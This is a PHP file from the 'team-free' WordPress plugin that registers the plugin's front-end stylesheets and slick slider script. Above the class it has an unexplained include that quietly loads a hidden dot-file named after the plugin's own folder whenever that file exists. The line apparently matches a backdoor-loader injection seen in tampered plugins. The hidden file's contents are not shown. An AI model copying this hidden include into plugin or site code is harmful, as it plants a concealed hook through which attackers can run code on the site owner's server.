<?php
/**
 * The scripts.
 *
 * @link       https://shapedplugin.com/
 * @since      2.0.0
 * @package    team-free
 * @subpackage team-free/includes
 * @author     ShapedPlugin <support@shapedplugin.com>
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}  // if direct access

/**
 * Scripts and styles
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class SP_Team_Free_Scripts {

	/**
	 * Script version number
	 *
	 * @var string
	 */
	protected $version;

	/**
	 * Initialize the class
	 */
	public function __construct() {
		$this->version = '20170420';

		add_action( 'wp_enqueue_scripts', array( $this, 'sp_team_free_front_scripts' ) );
	}

	/**
	 * Front Scripts
	 */
	public function sp_team_free_front_scripts() {
		// CSS Files.
		wp_enqueue_style( 'slick', SP_TEAM_FREE_URL . 'assets/css/slick.css', false, $this->version );
		wp_enqueue_style( 'font-awesome-min', SP_TEAM_FREE_URL . 'assets/css/font-awesome.min.css', false, $this->version );
		wp_enqueue_style( 'team-free-style', SP_TEAM_FREE_URL . 'assets/css/style.css', false, $this->version );

		// JS Files.
		wp_enqueue_script( 'slick-min-js', SP_TEAM_FREE_URL . 'assets/js/slick.min.js', array( 'jquery' ), $this->version, true );
	}

}
new SP_Team_Free_Scripts();
